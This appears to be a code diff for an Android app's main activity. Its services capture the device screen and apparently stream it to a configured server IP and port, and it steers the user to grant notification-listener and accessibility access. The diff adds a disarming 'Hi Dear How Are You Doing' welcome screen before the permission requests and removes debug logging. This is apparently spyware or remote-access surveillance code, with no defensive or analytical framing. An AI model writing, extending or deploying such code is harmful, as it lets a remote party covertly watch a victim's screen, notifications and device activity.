@@ -8,8 +8,13 @@ import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
 import android.util.Log
+import android.view.Gravity
+import android.widget.LinearLayout
+import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
@@ -39,9 +44,7 @@ class MainActivity : AppCompatActivity() {
         ).let { permissions ->
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 permissions + Manifest.permission.POST_NOTIFICATIONS
-            } else {
-                permissions
-            }
+            } else permissions
         }
     }
 
@@ -54,26 +57,23 @@ class MainActivity : AppCompatActivity() {
             if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                 val resultData = result.data
 
-                // --- Start Screen Capture Service ---
+                // Start services (your existing code)
                 val screenCaptureIntent = Intent(this, ScreenCaptureService::class.java).apply {
                     putExtra("data", resultData)
                     putExtra("server_ip", SERVER_IP)
                     putExtra("server_port", SERVER_PORT)
                 }
-
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     startForegroundService(screenCaptureIntent)
                 } else {
                     startService(screenCaptureIntent)
                 }
 
-                // --- Optional: Start SocketService if needed ---
                 val socketServiceIntent = Intent(this, SocketService::class.java).apply {
                     putExtra("mediaProjectionData", resultData)
                     putExtra("server_ip", SERVER_IP)
                     putExtra("server_port", SERVER_PORT)
                 }
-
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     startForegroundService(socketServiceIntent)
                 } else {
@@ -96,16 +96,35 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        try {
-            mediaProjectionManager =
-                getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        // --- Show welcome message immediately ---
+        showWelcomeMessage()
 
-            Log.d("MainActivity", "Starting permission request flow")
-            requestAllPermissions()
-        } catch (e: Exception) {
-            Log.e("MainActivity", "Initialization failed: ${e.message}", e)
-            Toast.makeText(this, "App initialization error: ${e.message}", Toast.LENGTH_LONG).show()
+        // Delay 2 seconds before continuing app flow
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                requestAllPermissions()
+            } catch (e: Exception) {
+                Log.e("MainActivity", "Initialization failed: ${e.message}", e)
+                Toast.makeText(this, "App initialization error: ${e.message}", Toast.LENGTH_LONG).show()
+            }
+        }, 2000) // 2-second welcome screen
+    }
+
+    private fun showWelcomeMessage() {
+        val layout = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
         }
+
+        val textView = TextView(this).apply {
+            text = "Hi Dear How Are You Doing"
+            textSize = 24f
+            gravity = Gravity.CENTER
+        }
+
+        layout.addView(textView)
+        setContentView(layout)
     }
 
     private fun requestAllPermissions() {
@@ -114,14 +133,12 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (missingPermissions.isNotEmpty()) {
-            Log.d("MainActivity", "Requesting missing permissions: $missingPermissions")
             ActivityCompat.requestPermissions(
                 this,
                 missingPermissions.toTypedArray(),
                 REQUEST_PERMISSIONS_CODE
             )
         } else {
-            Log.d("MainActivity", "All permissions granted")
             continueAppFlow()
         }
     }
@@ -145,10 +162,8 @@ class MainActivity : AppCompatActivity() {
 
     private fun checkNotificationListenerPermission() {
         try {
-            val enabledListeners =
-                Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+            val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
             val packageName = packageName
-
             if (enabledListeners == null || !enabledListeners.contains(packageName)) {
                 Toast.makeText(this, "Please enable Notification Access", Toast.LENGTH_LONG).show()
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
@@ -160,10 +175,8 @@ class MainActivity : AppCompatActivity() {
 
     private fun checkAccessibilityServiceEnabled() {
         try {
-            val enabledServices =
-                Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
+            val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
             val expectedService = "$packageName/${MyAccessibilityService::class.java.name}"
-
             if (enabledServices == null || !enabledServices.contains(expectedService)) {
                 Toast.makeText(this, "Please enable Accessibility Service", Toast.LENGTH_LONG).show()
                 startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
@@ -187,26 +200,14 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<String>,
-        grantResults: IntArray
-    ) {
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-
         if (requestCode == REQUEST_PERMISSIONS_CODE) {
-            val denied = permissions.zip(grantResults.toTypedArray())
-                .filter { it.second != PackageManager.PERMISSION_GRANTED }
-
+            val denied = permissions.zip(grantResults.toTypedArray()).filter { it.second != PackageManager.PERMISSION_GRANTED }
             if (denied.isEmpty()) {
-                Log.d("MainActivity", "All permissions granted after request")
                 continueAppFlow()
             } else {
-                Toast.makeText(
-                    this,
-                    "Some permissions were denied: ${denied.map { it.first }}",
-                    Toast.LENGTH_LONG
-                ).show()
+                Toast.makeText(this, "Some permissions were denied: ${denied.map { it.first }}", Toast.LENGTH_LONG).show()
                 Log.e("MainActivity", "Denied permissions: ${denied.map { it.first }}")
             }
         }
